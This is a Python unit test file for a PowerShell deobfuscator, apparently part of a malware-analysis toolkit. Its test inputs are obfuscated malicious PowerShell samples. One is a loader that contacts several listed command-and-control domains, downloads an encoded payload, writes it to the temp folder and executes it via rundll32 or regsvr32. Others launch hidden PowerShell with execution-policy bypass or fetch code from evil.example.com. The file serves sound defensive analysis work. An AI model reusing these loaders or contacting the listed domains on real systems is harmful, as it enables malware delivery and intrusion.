from .. import TestUnitBase

import base64
import lzma


class TestPowerShellASTDeobfuscator(TestUnitBase):

    def test_real_world_01(self):
        data = BR'''&('set-varIAbLE') gHc7R6XtR8aE 16;.('SET-vaRIabLE') PkfYKFVSBTmn 27;.(.    ('{2}{0}{1}'-f'c','m','g')    ('{4}{2}{3}{0}{5}{6}{7}{8}{6}{9}{1}{2}'-f'-','l','e','t','s','v','a','r','i','b')) EUCsMplIyR03 43;&(&('{0}{1}{2}'-f'g','c','m')"seT-VARiaBLe") F8riv8rRCqrK((((&"get-vARiaBle" gHc7R6XtR8aE).('vaLUE')+29)-AS[chaR]).('tOsTrinG').iNVoke()+(((."GeT-VaRIAblE" PkfYKFVSBTmn).('{4}{2}{0}{1}{3}'-f'l','u','a','e','v')+74)-as[CHAR]).('tosTrInG').INVOke()+(((&"gEt-VarIabLe" EUCsMplIyR03)."VaLUE"+56)-as[cHAr]).('{4}{2}{5}{4}{3}{1}{0}{6}'-f'n','i','o','r','t','s','g').INvOke());PowERsHELL -NONiNtErac -nOLOgo -NOP -Windows HIDDEn -ExEC BYpasS (    .('{7}{4}{9}{0}{2}{3}{1}{6}{3}{5}{8}{4}'-f'-','r','v','a','e','b','i','g','l','t') F8riv8rRCqrK).('{4}{3}{1}{0}{2}'-f'u','l','e','a','v')    .('{5}{2}{6}{5}{4}{0}{1}{3}'-f'i','n','o','g','r','t','s').iNvokE()'''
        result = data | self.load() | bytearray
        self.assertTrue(
            result.count(b'Set-Variable') == 4
        )

    def test_format_string_evaluation(self):
        data = (
            b'''(  ITeM  VarIAbLe:2OF09b  ).VaLue::"dEFauLtneTwORkcrEdEnTiALs"'''
            b''';.("{1}{0}"-f'wr','i')'''
            b'''("{4}{0}{8}{2}{3}{1}{5}{6}{7}"-f'/',':443','.','.com','http:/','/','download/p','owershell/','example')'''
        )
        deob = self.load()
        result = data | deob | str
        self.assertIn('example..com', result)

    def test_string_replace_chain(self):
        data = (
            b"'hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm'"
            b".Replace('fTdH8C6','ttps://')"
            b".Replace('s97YMGcyg0WCr','o')"
            b".Replace('z2Wr6qQR', 'e')"
        )
        result = data | self.load() | bytearray
        self.assertIn(b'https://evil.example.com/boom', result)

    def test_real_world_02(self):
        data = BR'''sEt-iTEM ('v'+'aria'+'bLE:'+'s2P4'+'O')  (  [Type]("{1}{0}" -F'vERt','CON')  ); Set-ITeM  ('varIablE'+':'+'t51') ([type]("{7}{1}{0}{3}{6}{5}{4}{2}"-F 'omPReSsion.cOMP','O.C','E','rE','oNmOd','SI','s','i')  )  ;seT-VARiaBlE  ("t"+"u49Q") ( [type]("{2}{3}{4}{0}{1}{5}" -f'c','EpoIn','NeT.S','e','RvI','tmanAgeR')  );   SET  ("{1}{0}" -f'vYp','7')  (  [TyPE]("{0}{6}{4}{1}{7}{5}{3}{2}" -f 'NET.se','yP','PE','y','uriT','Olt','C','rOtoC')  )  ; SET ('CUw'+'3')  ([TYpE]("{5}{2}{7}{3}{0}{1}{4}{6}" -f 'pOi','N','YSTeM','ervIcE','Tm','s','aNAGER','.Net.S') ) ; ${b`x1`4N}  =  [tYPE]("{1}{2}{0}" -F'T','Net.We','breqUeS')  ; ${Yn4U`15} =  [tYpE]("{3}{2}{0}{1}"-F'ch','E','nTiAlcA','neT.CrEDE')  ;SET-iteM  ("{3}{0}{1}{2}" -f 'bLe:','TQ','4pIV','VARia') (  [tyPE]("{0}{2}{4}{1}{3}" -f 'Te','d','Xt','INg','.EncO') );sv ("{1}{0}" -f'9PUc','Xt') ([tYPE]("{2}{1}{0}"-f 'E','Il','Io.f')  ) ; ${rU`o3}= [TypE]("{2}{0}{1}"-F 'V','AtoR','aCti') ;  SeT-itEM  ('VariA'+'bl'+'E:Ipjn')  ([type]("{0}{1}"-f 'TY','PE') ); ${r`o}=("{1}{2}{0}" -f'.1','127','.0.0');${r`EU} = P`ING ${r`O};if (${R`eU} -match ("{1}{0}"-f 'evut','ic')){${Ks}=ge`T`-RaNdOm -Max 11;function tR`iomE(${T`e}){${I`i}= (gi ('V'+'AriA'+'BlE:'+'s2p4'+'O')  ).vaLue::("{2}{1}{0}{3}" -f'se','mBa','Fro','64String').Invoke(${te});return ${ii}};function aS(${S`A}){-join((${s`A}."le`N`gTh"-1)..0|foreacH-`oB`J`EcT{${sA}[${_}]})};${b`Iz}=$(g`ET-`wmIoBj`eCT ("{1}{5}{2}{6}{3}{4}{0}"-f't','Win32','mp','stemProd','uc','_Co','uterSy') -computername ('.') | S`eL`ECt-`ObjEct -ExpandProperty ("{0}{1}" -f 'U','UID'));function NI`Ll(${T`yo}){${kj}=nE`w`-`oBJeCt ("{3}{0}{2}{1}"-f'O.Mem','tream','oryS','I')(,${T`yo});${m`m}=(NEW`-o`BJEct ("{0}{3}{2}{4}{1}"-f'IO.','r','mRead','Strea','e')(N`EW-`OBJ`eCt ("{2}{0}{3}{4}{1}{5}{6}"-f 'mpr','pStr','IO.Co','ession.Gz','i','ea','m')(${Kj}, ( gEt-varIablE  ("t5"+"1")).vAlUE::"D`e`COMPRESs"))).("{1}{2}{0}" -f 'ToEnd','R','ead').Invoke();return ${m`m}};function t{${Z}=@(("{1}{2}{3}{0}"-f 'm','mictosof','ts','.co'),("{2}{1}{0}{3}{4}"-f'rs.','e','qartabe','c','om'),("{5}{1}{4}{2}{0}{3}"-f 'iadelleentrat','g','z','e.site','en','a'),("{1}{2}{3}{0}"-f 'm','teslao','ilcar','.co'),("{0}{1}{4}{2}{3}"-f 'h','o','.','com','likokooo'),("{1}{0}{2}{3}{4}"-f'l','ub','a','znze.','online'),("{3}{2}{1}{0}"-f'icu','.','ak','hiteron'),("{1}{2}{0}" -f'te','ab','rakam.si'));${z}=${Z}|s`oRT-`obJE`Ct {GeT`-raND`om};Foreach(${T} in ${Z}){if(.("{1}{2}{4}{3}{0}"-f 'n','T','est-Co','ectio','nn') (${t}) -Count 1 -quiet){${Rr}=${T};}};return ''+'ht'+'tp'+("{1}{0}" -f '://','s')+${r`R}+'/'+''};function O`sI{${rY}=&('T');${m}=${R`Y}+'?'+${B`Iz};  (  Ls ('V'+'ARIabl'+'E:'+'Tu'+'49Q')).VAlUe::"Se`cUR`i`TyP`RoTO`COL"= (  GEt-vaRiABle  ("{0}{1}" -f '7v','YP') -Value)::"T`Ls"; (  get-cHildiTem  ('vArIaB'+'Le'+':cuW'+'3')  ).VaLUe::"s`eR`VerceRtI`FI`c`A`TEVAliDat`iOnCAllb`ACK"={${T`Rue}};${a}=&("{2}{1}{0}" -f 't','objec','new-') ("{2}{1}{0}" -f 'nt','ie','net.webcl');${A}."Pro`Xy"= (  vaRIABLe ('B'+'X14n') ).valUe::("{2}{3}{1}{0}{4}" -f 'eb','temW','G','etSys','Proxy').Invoke();${a}."pRO`xY"."crEDenTi`A`lS"= (  get-cHildITem ("{0}{1}{3}{2}{4}"-f'Var','i','bLE:Y','a','N4U15')).vaLue::"DeFAul`T`crED`eN`TiaLs";return &("{0}{1}"-f 'N','iLL')(${A}.("{2}{1}{3}{0}"-f 'a','nloadD','dow','at').Invoke(${m}))};.("{0}{1}"-f's','al') ("{0}{1}"-f'ra','ndomG') ("{1}{2}{0}" -f'l32','run','dl');function K`eLv{${FD}=&("{1}{0}" -f 'i','os');${U}=${Fd}.("{2}{0}{1}"-f 'ubst','ring','s').Invoke(0,1);${E`F}=${f`d}.("{1}{0}"-f 'move','re').Invoke(0,1);${o`o}=${EF} -split'!';${Vr}=  (  VaRIABLE  ("{1}{2}{0}"-f 'Piv','Tq','4')).VaLUE::"UT`F8";foreach(${O} in ${O`o}[0]){${o`UT}=@();${O`A}=${U}.("{2}{1}{0}"-f'ay','arArr','ToCh').Invoke();${O}=.("{0}{1}"-f 'T','riome')(${o});for(${i}=0; ${I} -lt ${o}."cOU`NT"; ${I}++){${O`UT} += [char]([Byte]${O}[${I}] -bxor[Byte]${oA}[${i}%${O`A}."C`OUnT"])}};${sS}=${e`F}."r`E`plAcE"((${Oo}[0]+"!"),${V`R}."gE`TstrI`Ng"(${O`UT}));return ${s`S}};${a`ZQ}=${eN`V:t`eMP};${f`BF}=(${D}=.("{0}{1}" -f 'g','ci') ${a`Zq}|&("{0}{1}{2}" -f'g','et-rand','om'))."nA`me" -replace ".{5}$";${H`B}=${a`Zq}+'\'+${F`Bf}+'.';function Cal`CC{${K`I}=.("{0}{1}" -f'kel','v');  ( gEt-vAriABlE  ("{0}{1}" -f 'xt9','Puc')  ).VALuE::("{2}{1}{0}" -f 'tes','llBy','WriteA').Invoke(${h`B},(&("{0}{2}{1}" -f 'T','e','riom')(${k`i} -replace ".{200}$")));if((&("{0}{1}"-f 'g','ci') ${H`B})."l`En`GtH" -lt 256){exit};${iz}=.('as')(("{2}{0}{1}{3}"-f 'evr','eSret','r','sigeRllD'));if (${ks} %2 -eq 0){&("{0}{1}" -f'ran','domG') ${hB} ${i`z};&("{0}{1}"-f'slee','p') 35;}else{${m`J}= (vARIAblE  ('rUO'+'3')  -vALueONlY)::"CrEatEi`NSTa`NCE"( ${I`pjn}::("{2}{0}{1}{3}"-f'ypefrom','cl','gett','sid').Invoke("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));${Mj}."Doc`U`MeNt"."app`LI`CaT`iON"."Pa`REnT".("{1}{0}{2}"-f'hel','s','lexecute').Invoke(("{0}{1}"-f'r','undll32'),(' '+"$Hb "+"$iZ"),("{3}{1}{0}{2}{4}" -f'ndowsSy','Wi','stem','C:','32'),${n`ULL},0);&("{1}{0}" -f 'leep','s') 35};.('sl');.("{2}{1}{0}"-f'svr32','eg','r') ('/s') ${h`B} > ${Hb}};&("{0}{1}"-f 'Ca','lcc')}else{exit}'''
        result = data | self.load() | bytearray
        for c2server in [
            b'mictosofts.com',
            b'qartabeers.com',
            b'agenziadelleentrate.site',
            b'teslaoilcar.com',
            b'holikokooo.com',
            b'ublaznze.online',
            b'hiteronak.icu',
            b'abrakam.site'
        ]:
            self.assertIn(c2server, result)

    def test_join_operator(self):
        data = (
            b"$ms = -Join ('Me', 'morySt', 'ream')\n"
            b"$rf = -Join ('Rfc2', '898', 'Derive', 'Bytes')\n"
            b"$xx = @($ms, 'rypto', $rf, 'esManag', 'rea')\n"
            b"$ua = ('Mozilla/5.0', '(Windows NT 10.0; Win64; x64)', 'AppleWebKit/537.36', '(KHTML,like Gecko)') -Join ' '\n"
            b"Write-Output $xx $ua\n"
            b"Write-Output $xx $ua\n"
        )
        result = data | self.load() | str
        self.assertNotIn('$ms', result)
        self.assertNotIn('$rf', result)
        self.assertIn('MemoryStream', result)
        self.assertIn('Rfc2898DeriveBytes', result)
        self.assertIn(
            "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko)'", result)

    def test_pipe_to_percent_alias(self):
        data = b"& ('iex') (-join ('a','b','c'.Split('') | %{$_}))"
        result = data | self.load() | str
        self.assertNotIn(')\n)', result)
        self.assertEqual(result.count(')'), result.count('('))

    def test_real_world_03(self):
        data = BR'''$v='i'+''+'E'+'x';sal foo $v;$pzhhqdwl=foo(foo($($('(nQNVrd3W2GjJK36w-objQNVrd3W2GjJK36ct SystQNVrd3W2GjJK36m.NQNVrd3W2GjJK36t.WQNVrd3W2GjJK36bCliQNVrd3W2GjJK36nt).Dos2Wr6qQRtring(''hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm''.Replace(''fTdH8C6'',''ttps://'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e').Replace('s2Wr6qQR', 'wnloadS'))))'''
        deob = self.load()
        extract = self.ldu('carve', 'ps1str', single=True, decode=True)
        self.assertIn(b'https://evil.example.com/boom',
            data | deob | extract | deob | bytes)

    def test_real_world_04(self):
        data = lzma.decompress(base64.b85decode(
            '{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;4`xoJY4`22mwpqb!!Q5S=ID}{U?K5x?&Dq;lJ+F$KIshuz(HET`RD(!;GQ~`$;Z(#c_IW'
            'j4+$z|45pL?{1ci^H?w<TpRr0QS^X>wqF^k3rRod0CO*E*`62^A4z`xV6fS}6xM4@fklECsejWV2euB<losA9ccs@L39bYH|MSdF'
            'tAZ=@wl>xz$+>2dRE9l)68lDuI3C{0r`zAv4D|)6WL?iOycan~e?JYR=Q+-;7V?d~P8lB~J-u~Zo45s#p4Ode%i;u>8D|djZ2D}?'
            '%7y;~Ux|E=v{xMSkiumAI7ayv>_NmvW+F<pWp>IP8HWA#B4OoJU(C_&K-@p%x5~(gyotevFLZ?cE+d}p-#E=h29f}j(TnOfci_r0'
            'mR>g&Hgam3tj4e#cg;kbQfiMBH3-`pzNj_jjx-^}F}D=k9FBf0m*%N2wp&A<nG9H}Y8Y?uae%P0Rqr7ACjBoEZ%58HDxInaTjOYA'
            'YX6j@d-2zwS1>6hdP0;&e~vzlNVabx$Xlbko0u=$g0F;6j`Cvk@Mna}FFw1kWj=#LX|=QJ>5Pm8xfREoFJ^8gSjcpygy7bS$Qn`&'
            'w~<jyFf27nuLwrl(O7Oh%U~F`X<usFP2admS_c&t1bU(1iIZf*E%+v&2dmu>*DQJejTO-R_{rZFm<{sU=BElX1?VBPXzdkO^V4-c'
            'eTi)eYugLvp;|&_{uxZy@hwJ=!#2ClG~lM+|Kj$EYuQm;IcMy_SE0WxaK8RzJY=l}eu0RIsb4QJl&8N~Op!->=SmzKcSAcfhsMoe'
            '?k6IR4I`#t9BowK(ur<1Q^P0;D1ze|r4ed|_YV7aL-TZ6B~fg+PKAwrRvL5f{U;$qMu)sjWSft?FWIS&Jd;4=0Ydu?508!(bnEah'
            'qdl*5RvwokXg9mNlfl8LP}D^B%Uy~`{HSN4-{C}LjvZnmrj@B*H7br`trfT43q4dET(;yVQ!1s|TvxVDq*}7^vO*Zm1I}>?a8dje'
            '0Qp*~utJNW|Lpg1S>$+ZuSN3UFBajT{;YaIrG~F5K_W#9973tH!p!uilJ9WOkbBBj^t2fw5&$$H2mxp6z(F$L!1|^JcO^1#j2(I*'
            'n!Ke;yJw=B063{Cr9W3C(S|?Xg1`I#u;>@Ctt-_{M^#j-a;XO?kTDVk{iXRXhFG&;D^nWpn;tasS3XkD-l2uwqVb9Bx~7)Avz3g#'
            '3wZa3)mwi;8M}nP&p-oe;<}J~0y&&846mIFWk>imW?LVit+koLxtG9&|LseLowa|1H-;V=Fmj7jKrIBF!?t`0upNeCqRpVb?XhHh'
            '&X3S&F=T69#MioDP+dIGasFm%B7e>^vp^h8yOD&jpPf(9?c7ACIDhS7tRZHFh%hPlrgb>xihPuCqEOL!gU2_n-|vknPkv4Bd8Iw?'
            '83Y&vm>n1qk4;QNC$SH{k6HC&V_I1nk9-k6Sd4=|?U$Xl9~7OIi4l0TVLX*J0ah9)<y|ccWc;Af_JIkYHFC(PpRk&<AGoRM`9G|n'
            'hIkgHK#Hq!cYLs)hb1e0gbn^=JSlh|BnW!3v_Vad=&O9opB8y6x*)0~7B$7?J+xJ@3gn1A&O1HTt3{kBiw%5&(JH-nn#ejTx_>)F'
            'U34Ex3g8jJlBAfOk|9Q@kfq?XI^gy}mdED#3@@(?5*YiP(WQfnJ_nB^H-$wJvORR{VN;VYg7(+rFZ1_n$)iu)MpBWoA@uHr$kgO?'
            'iT>(3Q;M~HiCV%UcE0kP0Iy!76F7M3hZU8U#oLn~ko3XS2PiRWF*8tY+PxIeSl1#1tUGvx55lC8%cPGwb;0W=Vny!=Aj&UY){#tj'
            'C0P$+>@mJr=We=-ovAW@PqNCGJI)_=Mx0LBQCJ*_@*3^Ri<)tKN*Vq6*Dta8F;XM3ukSaGvYF%=FiG`OVZ?KURox-TtLyz2vcO%A'
            '(ml(w^UBPCuk1?bHFrD(VX0aME{${YBnGp&fhBmPw+%g+ny3UqWAI%ywdt;9HNHZ-R_ln6(15tTm4Qso8-34y9mJx8t(qIcol2HH'
            '{Fgnnmc3{<K}!%e0dS&oO-S)?fj0zQNcyVU3JmR~E)*Y3t|E&$bpLu{I>DVZmaxkso9M-JUcGgwktyDjQ0rtrn$L>bXu@(NA#ce?'
            'RUPl<#dbBEzqI=?uNqdbM@Z1ru-O9uD3SH@2N5kz;S>?&P?N!IhgOEv%gx68QQU?2T2<TBu-&Zdri0b;q$lzLnQ@ro{!uA1Od5R1'
            'fP~3nrXO<obH~;FO?i(MG4P#7>?1~8Ku(s?UX*}g*Z8j7F+JiAMlUAHcwf);@_oS*C$N|+-QY~R4tT0p3q;y_;By#M+}17A&lU%Q'
            '_UDc!@5^e50#OnBnI!_Rt69>(OkatR!QUL6c$L<5z|v2!#U}LE9?4%!Y|E<WgGdBZWnRojEDTE_evs+YMTTu$59|WYoa=&rs5ep@'
            '2bsCaCvvpIiljbl9!*LMVhC}0j4Go5xdlnAI`WF$yWX9F6B_D&_$Q7gAXIZHGC-r%hTc5`c{>YGPhP5AarkmVJoT}w$=*=PW&O8S'
            '@7h6bt-!mFr!Dj*7!t`Usr?Jn(NR0aA|r)2MGsR*&e3c|ziO29dE?oSaF=sO_c_PW7`e|z^p6E@Ur+Q*8);~w4c`4e`iORw4PRFZ'
            'W%vgRrSgm=bulI%AN26w8|mTLm{|W^ad0yCz%!pps{eG*D<}BkW(((nSfy85`^Ud&coqRxyxiaDn-2*p)R8mjjb!`oC@a2lo)k{Y'
            '`jwfYr?;0yhYg0s2}e>+>=&TTcin7D-qvL2^hY;p9k*l3RcLoJMOeouN%C|r`6x%S_yXmJ@K`6}F_;=e)2ZAa4qdf98JQ<MlHKC+'
            'fU>7=P!9mkiH`^LJ-ZR{@IZenIpQVq@*^de;kXXrL!r+qaaZkg%DpUnH3%`%yO9=wYM`(zBju%6=SA-!uVhJdN18zo`biRYhywIR'
            '@BU<wu?k(ERba#U%%rY@v^(+f-n=t7L&L$%CWDZ@M|%;k{pa-pJ+Rff=5)aE^9`I>rpN(<frC(HL~dRiTv5O-yja%&m)~~Y#Xh=N'
            'I%8QV4a!wt|A$nn%gy!X9+ajg=RnU&Hv{_)T?AZM68Tv|`>ebSN4A4}RJ?$Y-X(VwMw(b3F|x+?ZWvP&$i8SkuZBxtYMO4hX`RYO'
            'kzVKCc{Fej$V`m#?x{~=*=WX_bVNIaVEMiEpU*pig3PO?)-BxEH5t`2MGrSE1$f<0`{$I($=mMaD~`2TVs;A85kYjwi`wtcNfKzm'
            '?wbUG2@4lZ>4rh<>tEv>HQ)<Zszi|cWKTFF+v`@md@S8hhj~?>W)DZ-e|nW;6FM@`Ya*MzKRLc_CcQ*w2MJ?SsM^Q+m^QBubpJ@1'
            '1cXp1mW?Bf^3CFbqYRAWo?%3*wp~RUEH`U$A$=VyX*_#I0sO3V+Ujc|8kP~^SU&1sNV_sn111)}q^SXsg{M|snMvvY+A2@piZsHK'
            '^?Rg%_pwnP7Zpt&J?ZZXQQm~VX!!U72PhSIn1qg`omRmr6VyWaucbK&kBC%^#9CJhV(D@P|F!_TsTD7UlhRSDMdN#Wu(hS-zi~h5'
            'zg~2(^)ZWr<-GQBlpwM+WM9q{n36_W<UO%_Jd<dk@J=$?%UWKj{n^or*lnj~mf|1+TJ7Bk<l7)ZeBPqS4w_j>`hg?=RZ%s%CE)NI'
            '6=$GmP#oK|Q_<e7PifU7P-R;lz`U5DC+!2U5GwI=4q!HQ@;+n%HAbUT6F=llI^Wg(%NkX4%u@I8t{(FG^LhCQD$H-;C=~Fg9h}Gi'
            '5T!6wpj<CudKCZvSw>LDH_mR;U!)9|F6xvQk+-zKWRS`f2&2r4TB-navGkTXs>C-4ALe#ljH74NcCMT>i?`L7s`m1Ny+8p9U=0xh'
            '#d%U^?x{|=_;QibngEy7dhYTu@LpR2z6|m%*=$Qw$@SY*?XR}IOnfUo@ErHl?)hFO{8bN!mzt4+QG2CcDy=ipS_59Cl!&%?3du6R'
            'PEiCLbVi7)Lcv^-QaK`_9i;bHidmXejWWn#`jY-y$qYq{);y^<+p!=l5hVftlY%X{a#pt;@uzv_jE|4cy%J^frb&T|eqUlq6|n+7'
            '(av|ifDKSL26~cM%iL1S1@4za+b1Feh`Rx{%P4a;0ws<}7ZgJk;iHn?O}xpmVS_Bm_Yd)AFBpZFZ!)*bGf#rx6dXY+h}JcTE3P8k'
            '6nj;AHg*^Bq@lRt<HHDVNd<g%a~N`V^oq%c4c`6*rylJ?_ssU<hpBu*C44H!9lrv>@Ukmu&q5miJpiUIX8?ryDq&p`lfOG);Kmz^'
            'Ico5q`RV|*n<vxl%`3w<z3<{M-G0!lYBf(diEUwwE{jH$9tz>}Jq{=m!p|m1_W9he=9Qgs#17Kf5v|{-+_vCZ)<)_q>`)>zxUk}G'
            'vSxz+u~>rgWGjmwiLkW+zNSx|wqKvy=!~)}fBrH23fQ`dq#7V)XEcjqrzG=r?%g$=OxFOj>?SPUwCvuol!tp=GR`q>)1KF^A5IV>'
            '`dGE`&10TH7~OR`QqI(Z$KB~XEBeb-1T`)vXfYf;6W|dX={UHm9ShK#(hEY;#3g7Oapz20b@0P(KWpb>RXN%DQv2ZFBJx>xa~W{U'
            '^yWWN${MYz{1<{P+;Fm3#79_(0)$-{?KqNvxQ{#?je1H?BT(c7qp$Da{`-`gsLT0fHDA|l`GSdhau@=pN&f-9iaZA~wO}1zjqKBO'
            'rV!wqBHgNH{zV+JP}s5^q{_FPy`iUc335WwZZu1lY-7q{`kVkH_N{M8$`{2;F`BZ08Kdl3WdWUV2bo5I%QBpGGldelfh=-h#vo9c'
            'gKK)I9Rnm0!oO}B11FO83#loM+*&%G?9xg5zvIvfQM};DXfDrNA@aUqPCV@I9&&Od@Z_7aZ^hL&934=1I~BAJs~#cAWbG!a(^V&M'
            'FbY5#X4w5t;Oy=Ln6Lks(B{1p%}Mgc?%x;0Kd9^!yqyGdcMx6ylpcXZe%?#KyI<ZA6#Lg&0m_$|m7E2kNol)^RJhtr#oKt@y8szY'
            '($0McvW?SuC2f1Z?W)zpNhL&?bW=-n2xntM^)%kT>!}Aj8iifKV=*`U+wy;&0h>Prh-ZV6NPxUv*<rzdj7G~WG`TlN=8^e<^CycM'
            'XVZl5%M3pZOlKvo*ZdSOC~-rgD7_QwFGRgo?TGYN?yH7pZYp$lO#YNPR1aYWcrn5q`mytAQ#Wv2!a1ge;9RA_JV%FWQa|$8Jv`l>'
            'V5YUOt+SEnyRyd{g>%zxZ3)?!hu;pyJty~{f@^9yzBjfD<G~l^GNke5;Rs~E4(+eX6qm_4ZC8PyRp%|6mj<FEO8u!TFbZhF=J(2_'
            'ufn>(TNU@P=E3F*MJm_PeST2+9Mv6})(fYha_0}ooXQo(f*1lkZafEjMzcdmCbH*Zg_73o(K?^FE-NRRy;of~mu=8qJ%k|{?uu)A'
            'LhZ(S@A|1mQye4T%f>Ke+|cFKIc*v*OpV{GL+&;XKkOdQ8wbq9lCmxy*#Hii|Gp+=k|+skGuIAhqE2#B2}qx~7bg`3F6N0HX)0#L'
            '224#i4+!iY#Y7;F$+1bOs?C{^7N(Z(I{<_InS0C!vyTPOV9e(B8<!IH4Jq-%1ojiy^`0stXRQniQn8o!oKbSD_%yAE*@BK-1%B2i'
            'l}F5Ee|fFH3YJRnQiCr9wEXKiD6L|KYoQ+NS_}Ois*M>3p*GxSadK}T3TtHrj+E109Y~LcogUk#bpzoov@c#MQupxXc`#L7i%5fS'
            '$p^}uI$hMCuwEJ2reJ_d9J_+MxOl&SSHg5WdUYh+{E^z7Xcnh|nZ7*~1cgeV^YT%DV`Pv}Jn!GiMgn1=Wz)@b1(8TF9?PY|-AvCz'
            'GWRD0#{dQoIhN<H%4o0#y8H0;zITEBu)W1<kwfyN8eY4Y-5D#I!Or67DrL1K-;grL{@jFxeA>eNn-=V(Zx2ep@U7R~lU%GHUhulw'
            '+UJNTszUd%+G|_<eenE4)8$HD0DY`*f%LUSg*WtBFcm7d5ZMH-<p(Es5}q(0r3JFA;D7v3RpJ(@*DH-ONX<w4E9SzlAVa1+1-P$H'
            '+O5^jU{&BOiBY0wPr3j7h11?vu~NJ3yn191gE*U>EZv$PDT1J6xHyGZkQO%XC-k4kY#S=+7$^Om>h>bk6OQ?xUoUXdVOUm+Un$P-'
            'MO9gM`fs1K^2VUX;^&WrH_08B5lXV^hp9ma5zjQAlE|9ba_bD65=mhbJ{rQ!iVSm@UCrRC^_bPHFK-htHCP%@K?*D^S@$bUUqc>2'
            'x{u^9Lw(a7=-t}LUoK1p064J|Xw~H^)HFW7ycMd+-mZupMrz(Be~s<hG9kN@Q#*q6x}`MXAm9enh72-Gv177-b7DRETCN~?@AON8'
            't3H*@LuVO7H52qhCW!S+1S0EWUEc&P=d%jK`51WhpgxdT+V}2O6<`7D?4^`-&f`o_Vt!uUm`c^a+c94yyed$q&;U=~H-AHMz*hd4'
            'XGPvR#14<oDLWem^2V^Ki(ZFQq0H$#pZBVDbx8sAQUfds8nJhkU)EEEr$Q>+V5CoxZ^f35&3s?^w<;z|aJp0$#nz~!rkAV&Hn6Tn'
            '9i1SRdo(fIcq~}^{5%und6Fmgo}_0zh&65)1U>RU1!cpfi`Im^c@s|(G{l!rAVT`k3A#OJ@=(B^W%m2Z=RUSZxo7*S+m|ipp<({2'
            '>M9)J0iPli(S)bALG39v0DIFBt#I{tbN`!U+f0HpX9>P5puz{JH>{9n{t2Hrq(-EsMwJ<O9U?gmcX1@m`%lX~_AuKLd3yi-L?}`Q'
            'JP}{tpk_eo6XReH?gf07m}Q}Mpg?(oUQ)!eC7Tv-X^>OSd{xxY5?X^nN5*|xCDi{fu@(fxMVqnuNiEJHeCig;|2(WPq2wjk)8`o}'
            '3lLWb6~v9TIQ~w!Lbq(@IZstdk7%+mXR_Fa*g{nP-?xP3%-12@$O9Sv%71E-mc1J23+%&B5GmQGNn4Lx>&B^DGD+fxk@@WV7|s<M'
            'do^hi^YHNxSS<48B)q*1Rii7$nC6g>_BSH{Q`S#gdi|s)00G!4v}XVSQhC8?vBYQl0ssI200dcD'
        ))
        test = data | self.load() | str
        self.assertTrue(test.lower().startswith(
            "if ((get-wmiobject win32_operatingsystem).osarchitecture -match 'ビ')"))
        self.assertIn("'https:""/""/paterdonga"".com/uploads/HelpPaneS'", test)

    def test_braced_variable_with_scope(self):
        data = b'${env:ComputerName}'
        result = data | self.load() | str
        self.assertIn('$env:ComputerName', result)
        self.assertNotIn('$drive:', result)

    def test_param_block_with_attributes(self):
        data = b'function F { [CmdletBinding()] param($x) $x }'
        result = data | self.load() | str
        self.assertIn('param', result.lower())
        self.assertIn('CmdletBinding', result)

    def test_command_arguments_after_expression_name(self):
        data = b"&('Get-WmiObject') -Class Win32_processor"
        result = data | self.load() | str
        self.assertIn('Get-WmiObject', result)
        self.assertIn('-Class', result)
        self.assertIn('Win32_processor', result)

    def test_real_world_05(self):
        data = (
            b"function Ge {\n"
            b"[CmdletBinding()]\n"
            b"param (\n"
            b"[parameter(ValueFromPipeline=${t`RUE}, ValueFromPipelineByPropertyName=${tR`UE})]\n"
            b"[Alias(('nam'+'e'))]\n"
            b"${f`Rk}=${en`V:`CompuT`ERN`A`Me}\n"
            b")\n"
            b"${An`Tivi`RU`SPr`oD`UCT} = .('gwm'+'i') -Namespace root\\securitycenter2 "
            b"-Class AntiVirusProduct -ComputerName ${F`Rk}\n"
            b"}\n"
        )
        result = data | self.load() | str
        self.assertIn('$env:', result)
        self.assertNotIn('$drive:', result)
        self.assertIn('-Class', result)
        self.assertIn('-Namespace', result)
        self.assertIn('root\\securitycenter2', result)
        self.assertNotIn('-\n', result)

    def test_foreach_with_external_variable(self):
        data = b"'65,66,67'.Split(',') | %{ [Char]([Int]$_ -bxor $key) }"
        result = data | self.load() | str
        self.assertIn('-BXor', result.replace('-bxor', '-BXor'))
        self.assertIn('$key', result)

    def test_set_alias_inlining(self):
        data = b"sal myAlias New-Object; myAlias Net.WebClient"
        result = data | self.load() | str
        self.assertIn('New-Object Net.WebClient', result)

    def test_set_alias_with_named_params(self):
        data = b"Set-Alias -Name foo -Value Invoke-Expression; foo 'Write-Host hello'"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)

    def test_string_join_static(self):
        data = b"[String]::Join('', @('Hello', ' ', 'World'))"
        result = data | self.load() | str
        self.assertIn('Hello World', result)

    def test_alias_survives_iex_inlining(self):
        data = b"sal x Invoke-Expression; x '[String]::Join('''', @(''Write'', ''-Host''))'"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
